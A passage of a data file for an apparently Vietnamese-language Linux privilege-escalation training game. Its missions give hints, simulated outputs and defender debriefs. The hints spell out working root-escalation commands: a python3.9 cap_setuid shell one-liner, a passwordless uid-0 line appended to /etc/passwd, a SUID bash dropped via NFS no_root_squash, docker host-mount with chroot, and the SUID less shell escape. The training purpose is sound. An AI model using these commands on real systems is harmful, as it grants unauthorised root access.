      'Mặc định, sudo CHỦ ĐỘNG xoá `LD_PRELOAD` khỏi môi trường khi thực thi (chính sách `env_reset`) — `env_keep += "LD_PRELOAD"` là một admin TỰ TAY mở lại lỗ hổng này, thường để debug rồi quên gỡ.',
      'Hàm có `__attribute__((constructor))` trong C chạy NGAY khi shared object được load, trước cả `main()` của binary thật — đây là lý do payload chạy được dù lệnh thật (`find`) chưa làm gì.',
      'DEFENDER: không bao giờ thêm `LD_PRELOAD`, `LD_LIBRARY_PATH` vào `env_keep` của sudoers; nếu cần debug bằng preload, làm trong session riêng KHÔNG qua sudo; audit `/etc/sudoers` định kỳ tìm dòng `Defaults env_keep` bất thường.',
    ],
    terms: [
      { term: 'LD_PRELOAD', def: 'Biến môi trường bảo dynamic linker nạp một shared object trước mọi thư viện khác.' },
      { term: 'env_keep (sudoers)', def: 'Danh sách biến môi trường sudo GIỮ LẠI thay vì xoá khi thực thi lệnh — mặc định nên rỗng với biến nguy hiểm.' },
      { term: 'constructor (C)', def: 'Hàm được đánh dấu chạy tự động ngay khi shared object được load, trước main().' },
      { term: 'dynamic linker', def: 'Thành phần hệ điều hành nạp các shared library cần thiết khi một chương trình khởi chạy.' },
    ],
    initialFilesystem: fsC7M12,
  },
  {
    id: 13,
    chapterId: 7,
    title: 'Quyền giấu trong capability',
    story:
      '`find -perm -4000` lần này hoàn toàn sạch — không SUID nào đáng ngờ. Nhưng SUID bit không phải cách duy nhất để một binary có quyền root. Linux có một lớp quyền khác, nhỏ hơn và dễ bị bỏ sót: capabilities.',
    steps: [
      { id: 'find_suid_clean', description: 'Xác nhận không có SUID lạ (kết quả sạch)', match: /^find\s+\/.*-perm\s+-4000/, output: ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/mount'].join('\n') },
      {
        id: 'getcap',
        description: 'Quét toàn hệ thống tìm capability bất thường',
        match: /^getcap\s+-r\s+\//,
        output: '/usr/bin/python3.9 = cap_setuid+ep',
      },
      {
        id: 'exploit_cap',
        description: 'Khai thác cap_setuid bằng os.setuid(0) trong python3.9',
        match: /python3\.9.*os\.setuid\(0\)/,
        output: '$ python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n# id\nuid=0(root) gid=1000(hacker)   <- root via cap_setuid (GTFOBins capabilities)',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Xác nhận lại bằng `find / -perm -4000 2>/dev/null` — SUID sạch không nghĩa là hết đường, Linux có một cơ chế cấp quyền khác mà lệnh này KHÔNG bắt được.',
      'Dùng `getcap -r /` để quét capability gắn trên file, khác hẳn lệnh tìm SUID.',
      'Kết quả báo `python3.9 = cap_setuid+ep`. Khai thác giống GTFOBins entry "Capabilities": `python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Capabilities (`man 7 capabilities`) chia quyền root thành ~40 đơn vị riêng biệt (cap_net_bind_service, cap_sys_admin, cap_setuid...) — một file có thể mang ĐÚNG MỘT capability mạnh mà hoàn toàn không có SUID bit, nên hai cơ chế kiểm tra khác nhau.',
      '`+ep` trong output `getcap` nghĩa là capability ở dạng "effective" và "permitted" — tức nó CÓ HIỆU LỰC ngay khi binary chạy, không cần thêm bước nào để activate.',
      'Nhiều checklist privesc (kể cả script tự động như linpeas) đôi khi chỉ nhấn mạnh SUID — capability là lớp dễ bị BỎ SÓT nếu người enum không biết chạy `getcap -r /` song song.',
      'DEFENDER: audit capability bằng `getcap -r /` định kỳ, không chỉ audit SUID; gỡ capability không cần thiết bằng `setcap -r <file>`; coi `cap_setuid`, `cap_sys_admin`, `cap_dac_override` trên bất kỳ binary nào là tương đương root và cần review nghiêm ngặt.',
    ],
    terms: [
      { term: 'Linux capabilities', def: 'Hệ thống chia nhỏ quyền root thành các đơn vị riêng (cap_setuid, cap_sys_admin...) gắn vào file qua extended attribute.' },
      { term: 'getcap -r /', def: 'Quét đệ quy toàn hệ thống tìm file có gắn capability.' },
      { term: 'cap_setuid+ep', def: 'Capability đổi uid, ở trạng thái effective+permitted — có hiệu lực ngay khi binary thực thi.' },
      { term: 'setcap / man 7 capabilities', def: 'Lệnh gắn capability vào file; trang man liệt kê đầy đủ các capability và ý nghĩa.' },
    ],
    initialFilesystem: fsC7M13,
  },
  {
    id: 14,
    chapterId: 7,
    title: 'Khi /etc/passwd tự mở cửa',
    story:
      'Không cần exploit phức tạp nào cả — lần này admin để /etc/passwd với quyền ghi cho TẤT CẢ MỌI NGƯỜI. Đây là lỗi cấu hình thô nhất nhưng cũng nguy hiểm nhất: mày tự thêm một user uid 0 và đăng nhập thẳng vào.',
    steps: [
      { id: 'check_perm', description: 'Kiểm tra quyền ghi của /etc/passwd', match: /^ls\s+-l\s+\/etc\/passwd/, output: '-rw-rw-rw- 1 root root 187 Jun 26 09:00 /etc/passwd   <- world-writable! mọi user đều ghi được' },
      { id: 'cat_passwd', description: 'Đọc nội dung hiện tại để biết format dòng', match: /^cat\s+\/etc\/passwd/ },
      {
        id: 'append_root',
        description: 'Thêm một dòng user mới với uid/gid 0 và không có password (append >>)',
        match: />>\s*\/etc\/passwd/,
        output: '(đã nối thêm dòng "pwned::0:0::/root:/bin/bash" vào /etc/passwd — uid 0, field password rỗng = không cần mật khẩu)',
      },
      { id: 'su_new', description: 'Đăng nhập bằng user mới tạo, không cần mật khẩu', match: /^su\s+pwned/, output: '# id\nuid=0(pwned) gid=0(root)   <- root via writable /etc/passwd' },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Trước khi nghĩ tới exploit, luôn kiểm tra quyền của chính các file hệ thống nhạy cảm.',
      'Dùng `ls -l /etc/passwd` — nếu thấy `rw-rw-rw-` (mọi nhóm đều ghi được), mày không cần khai thác gì cả. Gõ `cat /etc/passwd` để biết format dòng hiện tại.',
      'Append một dòng mới bằng `echo "pwned::0:0::/root:/bin/bash" >> /etc/passwd` (field 2 rỗng = không password), rồi `su pwned` và `cat /root/flag.txt`.',
    ],
    debrief: [
      '/etc/passwd có format `username:password:uid:gid:comment:home:shell` — chỉ cần uid và gid là `0` thì user đó CÓ TOÀN QUYỀN root, bất kể tên hay vị trí trong file.',
      'World-writable trên file hệ thống cốt lõi (`-rw-rw-rw-`, octal 666) thường xảy ra khi admin chạy `chmod 666` hoặc `chmod 777` để "fix nhanh" lỗi permission, rồi quên đổi lại — một trong những lỗi cấu hình thô nhưng vẫn xảy ra thực tế.',
      'Khác với các bài exploit phức tạp trước, đây không cần GTFOBins hay binary đặc biệt — chỉ cần kiểm tra quyền file CƠ BẢN; đây là lý do `ls -l` trên file hệ thống nhạy luôn nằm trong checklist enum.',
      'DEFENDER: /etc/passwd phải luôn là `-rw-r--r--` (644) — đọc được bởi mọi người (cần thiết để hệ thống hoạt động) nhưng CHỈ root ghi được; không bao giờ chạy `chmod 666/777` trên file hệ thống để "fix" lỗi permission tạm thời.',
    ],
    terms: [
      { term: '/etc/passwd format', def: 'username:password:uid:gid:comment:home:shell — uid/gid = 0 là quyền root.' },
      { term: 'world-writable', def: 'File mà MỌI user trên hệ thống đều ghi được (bit w cho group và other).' },
      { term: 'field password rỗng', def: 'Khi field thứ 2 trong /etc/passwd rỗng, hệ thống coi user không cần mật khẩu để đăng nhập.' },
      { term: 'chmod 666/777', def: 'Cấp quyền ghi/thực thi cho mọi người — gần như luôn là cấu hình sai trên file hệ thống.' },
    ],
    initialFilesystem: fsC7M14,
  },
  {
    id: 15,
    chapterId: 7,
    title: 'NFS không siết root',
    story:
      'Server export một thư mục qua NFS để các máy khác mount vào. Cấu hình export có một cờ nguy hiểm: `no_root_squash`. Bình thường NFS "squash" (hạ quyền) root của client xuống user thường — cờ này TẮT bảo vệ đó.',
    steps: [
      { id: 'read_exports', description: 'Đọc /etc/exports để xem cấu hình NFS share', match: /^cat\s+\/etc\/exports/ },
      {
        id: 'showmount',
        description: 'Xác nhận từ máy attacker những share nào đang export',
        match: /^showmount\s+-e\b/,
        output: 'Export list for target:\n/srv/nfs/share 10.10.14.0/24',
      },
      {
        id: 'mount',
        description: 'Mount share đó vào máy attacker',
        match: /^mount\s+.*:\/srv\/nfs\/share\s+\/mnt/,
        output: '(đã mount thành công vào /mnt — uid/gid của attacker được giữ nguyên, kể cả uid 0 nếu attacker là root)',
      },
      {
        id: 'create_suid',
        description: 'Từ máy attacker (đang là root), tạo binary SUID ngay trong share',
        match: /(cp\s+\/bin\/bash\s+\/mnt|chmod\s+\+s\s+\/mnt\S*)/,
        output: '(copy /bin/bash vào /mnt/rootbash, chmod +s -> vì no_root_squash, file này giữ owner root THẬT trên server)',
      },
      {
        id: 'run_on_target',
        description: 'Trên máy target, chạy binary SUID vừa tạo qua share',
        match: /\/srv\/nfs\/share\/rootbash\s+-p/,
        output: '# id\nuid=0(root) euid=0(root)   <- root via NFS no_root_squash SUID binary',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'NFS bình thường "squash" quyền root của client về user thường để tránh đúng kiểu lạm dụng này — có một cờ TẮT bảo vệ đó.',
      'Đọc `cat /etc/exports` — tìm cờ `no_root_squash`. Từ máy attacker (có quyền root cục bộ), `showmount -e <target>` rồi `mount <target>:/srv/nfs/share /mnt`.',
      'Vì client là root và `no_root_squash` đang bật, file tạo trong share giữ NGUYÊN uid 0: `cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash`. Trên máy target chạy `/srv/nfs/share/rootbash -p` rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Theo thiết kế gốc, NFS server "squash" (ánh xạ) mọi request từ uid 0 của client về một uid không đặc quyền (thường `nobody`) — đây là lớp bảo vệ MẶC ĐỊNH chống chính kỹ thuật này.',
      '`no_root_squash` tắt hẳn lớp bảo vệ đó: server TIN TƯỞNG uid gửi từ client, nghĩa là nếu attacker có quyền root trên MÁY CỦA HỌ (không phải trên target), file họ tạo trong share sẽ thuộc về root THẬT trên server.',
      'Đây là minh chứng rõ cho nguyên tắc "không bao giờ tin uid từ client" — NFS truyền thống tin uid qua giao thức mà không xác thực lại, khác hẳn các giao thức hiện đại hơn (Kerberos-based NFSv4).',
      'DEFENDER: KHÔNG BAO GIỜ dùng `no_root_squash` trừ khi có lý do cực kỳ đặc biệt và mọi client đều tin tưởng tuyệt đối; giới hạn export theo IP cụ thể (không dải /24 rộng); ưu tiên NFSv4 với Kerberos để xác thực thật thay vì tin uid mù quáng.',
    ],
    terms: [
      { term: 'NFS export', def: 'Thư mục trên server được chia sẻ qua giao thức NFS để máy khác mount vào.' },
      { term: 'root squash', def: 'Cơ chế NFS mặc định hạ uid 0 của client về user không đặc quyền khi truy cập share.' },
      { term: 'no_root_squash', def: 'Cờ tắt root squash — server tin tưởng uid 0 từ client, biến NFS thành đường privesc nếu attacker có root cục bộ.' },
      { term: 'showmount -e', def: 'Lệnh liệt kê các NFS export đang được một server công bố.' },
    ],
    initialFilesystem: fsC7M15,
  },
  {
    id: 16,
    chapterId: 7,
    title: 'Group docker là cửa hậu root',
    story:
      '`id` cho thấy mày thuộc group `docker` — nghe có vẻ vô hại, chỉ để chạy container. Nhưng docker daemon chạy bằng root và không hỏi lại quyền: bất kỳ ai trong group đó coi như đã CÓ root, chỉ cần biết cách mount đúng thư mục.',
    steps: [
      { id: 'check_group', description: 'Xác nhận hacker thuộc group docker', match: /^id\s*$/, output: 'uid=1000(hacker) gid=1000(hacker) groups=1000(hacker),999(docker)' },
      {
        id: 'docker_run',
        description: 'Chạy container mount toàn bộ filesystem host vào /mnt',
        match: /^docker\s+run.*-v\s+\/:\S*\/mnt.*--rm/,
        output: '(container khởi động, /mnt trong container chính là toàn bộ / của HOST, kể cả /etc, /root)',
      },
      {
        id: 'chroot',
        description: 'Từ trong container, chroot vào /mnt để có shell root trên host',
        match: /^chroot\s+\/mnt(\s+\/bin\/(sh|bash))?/,
        output: '# id\nuid=0(root) gid=0(root)   <- root TRÊN HOST via docker group + chroot mounted /',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root (của host, qua chroot)', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Group `docker` không có gì để làm với container theo nghĩa "sandbox an toàn" — nó tương đương quyền root trên HOST.',
      'Dùng `id` để xác nhận group docker. Rồi chạy `docker run -v /:/mnt --rm -it alpine` — lệnh này mount toàn bộ `/` của host vào `/mnt` trong container.',
      'Trong container, gõ `chroot /mnt /bin/bash` để "đổi gốc" sang filesystem host — giờ mày là root TRÊN HOST. Thoát ra và `cat /root/flag.txt`.',
    ],
    debrief: [
      'Docker daemon (`dockerd`) chạy với quyền root và lắng nghe qua socket Unix (`/var/run/docker.sock`) — bất kỳ ai có quyền giao tiếp với socket đó (tức là thuộc group `docker`) có thể YÊU CẦU daemon làm BẤT KỲ điều gì, kể cả mount filesystem host.',
      '`-v /:/mnt` là bind mount: nó không copy, mà MAP trực tiếp `/` của host vào `/mnt` trong container — container "tưởng" đó là volume riêng, nhưng thực ra đang đọc/ghi thẳng lên disk thật của host.',
      '`chroot` đổi root directory của một process — chạy nó nhằm vào `/mnt` (chính là `/` của host) biến mọi lệnh sau đó thành chạy TRÊN HOST với quyền root, dù vẫn đang "trong" container.',
      'DEFENDER: group `docker` PHẢI được coi tương đương `root` khi cấp quyền — không bao giờ thêm user thường vào group đó nếu không thực sự cần; cân nhắc rootless Docker hoặc Podman; giám sát ai có quyền truy cập docker socket.',
    ],
    terms: [
      { term: 'docker socket', def: 'Unix socket (/var/run/docker.sock) mà docker daemon lắng nghe lệnh — quyền ghi vào nó tương đương quyền root.' },
      { term: 'bind mount (-v)', def: 'Map trực tiếp một thư mục host vào container, đọc/ghi thẳng lên disk thật, không phải bản sao.' },
      { term: 'chroot', def: 'Đổi thư mục gốc (/) của một process sang một đường dẫn khác, dùng để "nhảy" vào filesystem được mount.' },
      { term: 'rootless container', def: 'Mô hình chạy container không cần daemon root, giảm rủi ro khi user thường có quyền chạy container.' },
    ],
    initialFilesystem: fsC7M16,
  },
  {
    id: 17,
    chapterId: 7,
    title: 'Pager cũ, chiêu cũ vẫn ăn',
    story:
      'Có một file `/root/secret.key` mày muốn đọc nhưng bị chặn quyền thẳng. SUID list lại xuất hiện một thứ tưởng vô hại: `less`, công cụ xem file theo trang. GTFOBins có sẵn chiêu escape từ trong pager này.',
    steps: [
      { id: 'try_cat', description: 'Thử đọc trực tiếp secret.key (sẽ bị từ chối)', match: /^cat\s+\/root\/secret\.key/, output: 'cat: /root/secret.key: Permission denied' },
      {
        id: 'find_suid',
        description: 'Liệt kê SUID binary, tìm thứ bất thường',
        match: /^find\s+\/.*-perm\s+-4000/,
        output: ['/usr/bin/sudo', '/usr/bin/mount', '/usr/bin/less'].join('\n'),
      },
      {
        id: 'escape_less',
        description: 'Mở less trên một file rồi escape ra shell root từ bên trong (!/bin/sh)',
        match: /less\s+\S+.*!\s*\/bin\/sh|less\s+\S+\s*$/,
        output: '(đã mở less; trong less gõ `!/bin/sh` để spawn shell)',
      },
      { id: 'shell_root', description: 'Xác nhận shell vừa spawn có uid root', match: /^id\s*$/, output: 'uid=0(root) gid=0(root)   <- root via SUID less !/bin/sh' },
      { id: 'read_flag', description: 'Đọc flag trong /root (giờ đã có quyền)', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Đọc trực tiếp file bị chặn quyền — nhưng có một pager SUID có thể giúp mày đọc bằng quyền của NÓ, không phải của mày.',
      '`find / -perm -4000 2>/dev/null` cho thấy `/usr/bin/less` có SUID — bất thường, một pager không cần quyền đó.',
      'Mở `less /etc/hostname` (hoặc bất kỳ file đọc được), rồi từ trong less gõ `!/bin/sh` để spawn shell — shell đó kế thừa effective uid root của less. Thoát less, `id` xác nhận, rồi `cat /root/flag.txt` và `cat /root/secret.key`.',
    ],
    debrief: [
      'Pager (less, more) có một tính năng cũ nhưng vẫn còn: gõ `!command` ngay trong giao diện xem file sẽ chạy lệnh đó bằng SHELL CON — nếu less đang có SUID, shell con đó kế thừa effective uid root.',
      'Đây là cùng họ kỹ thuật với "sudo vim escape" ở bài gốc Chương 7, nhưng khác cơ chế kích hoạt: lần đó là sudo NOPASSWD cho phép chạy vim bằng root; lần này là SUID bit gắn trực tiếp vào binary less, không cần sudo gì cả.',
      'File `/root/secret.key` ban đầu chặn quyền hoàn toàn đúng (chỉ owner root đọc được) — nhưng quyền đó vô nghĩa nếu một con đường khác (SUID less) cho phép mày TRỞ THÀNH root trước khi đọc.',
      'DEFENDER: gỡ SUID khỏi pager/editor không cần thiết — chúng hầu như không có lý do hợp lệ để mang SUID; nếu cần xem file nhạy bằng quyền cao, dùng cơ chế có audit log (như `sudoedit`) thay vì SUID trực tiếp trên binary đa năng.',
    ],
    terms: [
      { term: 'pager (less/more)', def: 'Chương trình hiển thị nội dung file theo từng trang, có tính năng chạy lệnh shell từ bên trong.' },
      { term: '!command (trong less)', def: 'Cú pháp gõ trong less để chạy một lệnh shell con — kế thừa quyền của process less.' },
      { term: 'Permission denied', def: 'Lỗi khi user không đủ quyền đọc/ghi/thực thi file theo permission bit hiện tại.' },
      { term: 'sudoedit', def: 'Cơ chế sửa file bằng quyền cao có audit log, an toàn hơn cấp SUID trực tiếp cho editor/pager.' },
    ],
    initialFilesystem: fsC7M17,
  },
  {
    id: 18,
    chapterId: 7,
    title: 'Tốt nghiệp: chuỗi enum đầy đủ',
    story:
      'Bài tốt nghiệp Chương 7. Không ai chỉ sẵn lỗ hổng nào tồn tại — mày phải tự enum đầy đủ (id, sudo -l, uname -a, /etc/passwd, SUID), nhận diện đâu là mồi nhử và đâu là đường THẬT, rồi đi đúng đường ngắn nhất tới root.',
    steps: [
      { id: 'id', description: 'Bước 1: xác định mày là ai, thuộc group nào', match: /^id\s*$/, output: 'uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)' },
      {
        id: 'sudo_l',
        description: 'Bước 2: kiểm tra sudo -l',
        match: /^sudo\s+-l/,
        output: [
          'Matching Defaults entries for hacker:',
          '    env_reset, secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          'User hacker may run the following commands on this host:',
          '    (root) NOPASSWD: /bin/bash',
        ].join('\n'),
      },
      { id: 'uname', description: 'Bước 3: kiểm tra kernel (đường vòng, không cần dùng)', match: /^uname\s+-a/, output: 'Linux gradbox 5.15.0-76-generic #83-Ubuntu SMP x86_64 GNU/Linux' },
      { id: 'cat_passwd', description: 'Bước 4: đọc /etc/passwd tìm user lạ', match: /^cat\s+\/etc\/passwd/ },
      {
        id: 'find_suid',
        description: 'Bước 5: liệt kê SUID — sẽ thấy base64 (mồi nhử, bỏ qua)',
        match: /^find\s+\/.*-perm\s+-4000/,
        output: ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/base64'].join('\n'),
      },
      {
        id: 'take_shortest',
        description: 'Bước 6: nhận ra sudo NOPASSWD /bin/bash là đường ngắn nhất, dùng nó thay vì mò GTFOBins cho base64',
        match: /^sudo\s+\/bin\/bash/,
        output: '# id\nuid=0(root) gid=0(root)   <- root via sudo NOPASSWD /bin/bash (đường ngắn nhất, không cần GTFOBins base64)',
      },
      { id: 'read_flag', description: 'Đọc flag tốt nghiệp trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Chạy đủ bộ enum trước khi quyết định bất cứ điều gì — đừng exploit thứ đầu tiên thấy: `id`, `sudo -l`, `uname -a`, `cat /etc/passwd`, `find / -perm -4000 2>/dev/null`.',
      'SUID list có `base64` — khai thác được qua GTFOBins nhưng đó là đường VÒNG. Nhìn lại `sudo -l`: có dòng NOPASSWD cho cả `/bin/bash` luôn — đây mới là đường thẳng.',
      'Bỏ qua base64, gõ trực tiếp `sudo /bin/bash` để có root shell ngay lập tức, rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Privesc thực chiến hiếm khi chỉ có MỘT con đường — checklist OSCP chuẩn luôn là: enum đầy đủ trước (đừng dừng ở phát hiện đầu tiên), liệt kê HẾT các vector khả dĩ, rồi chọn đường rủi ro thấp nhất/nhanh nhất.',
      'Một binary SUID khai thác được (như `base64` qua GTFOBins) không có nghĩa nó là đường TỐT NHẤT — nếu `sudo -l` đã cho NOPASSWD trực tiếp một shell, đó luôn là lựa chọn ưu tiên vì đơn giản và ít bước hơn.',
      'Đây chính là khác biệt giữa "biết một kỹ thuật" và "biết enum có hệ thống": làm đủ cả 5 bước enum trước khi hành động giúp tránh mất thời gian vào đường vòng khi đường thẳng đã nằm sẵn trong kết quả.',
      'Tổng kết Chương 7: mọi kỹ thuật đã học (SUID, sudo misconfig, PATH hijack, cron, capabilities, NFS, docker, /etc/passwd writable, shadow crack) đều bắt đầu từ ĐÚNG bộ enum này — thuần thục nó là nền tảng cho privesc trên bất kỳ hệ thống Linux thật.',
    ],
    terms: [
      { term: 'enum có hệ thống', def: 'Chạy đủ bộ lệnh enum chuẩn (id, sudo -l, uname -a, passwd, SUID, capabilities) trước khi chọn hướng khai thác.' },
      { term: 'mồi nhử (red herring)', def: 'Một vector khai thác được nhưng không phải đường ngắn nhất/an toàn nhất tới mục tiêu.' },
      { term: 'đường ngắn nhất', def: 'Trong nhiều vector khả dĩ, ưu tiên cách ít bước, ít rủi ro nhất để đạt quyền cao hơn.' },
      { term: 'privilege escalation checklist', def: 'Danh sách chuẩn các bước enum + vector cần kiểm tra trên một hệ thống Linux trước khi kết luận "hết đường".' },
    ],
    initialFilesystem: fsC7M18,
  },
];
